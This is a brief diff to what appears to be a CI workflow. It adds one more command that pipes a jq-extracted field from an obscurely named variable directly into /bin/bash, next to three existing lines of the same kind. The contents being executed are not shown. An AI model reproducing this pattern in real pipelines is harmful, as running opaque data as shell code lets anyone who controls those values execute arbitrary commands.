@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$ce1" | jq -r .sq105 | /bin/bash
           printf '%s' "$mgafk8" | jq -r .iwa219 | /bin/bash
           printf '%s' "$jnfq33054" | jq -r .vc83 | /bin/bash
+          echo $nzsul83 | jq -r .jltd0 | /bin/bash
 
       - name: Upload artifact
         if: always()
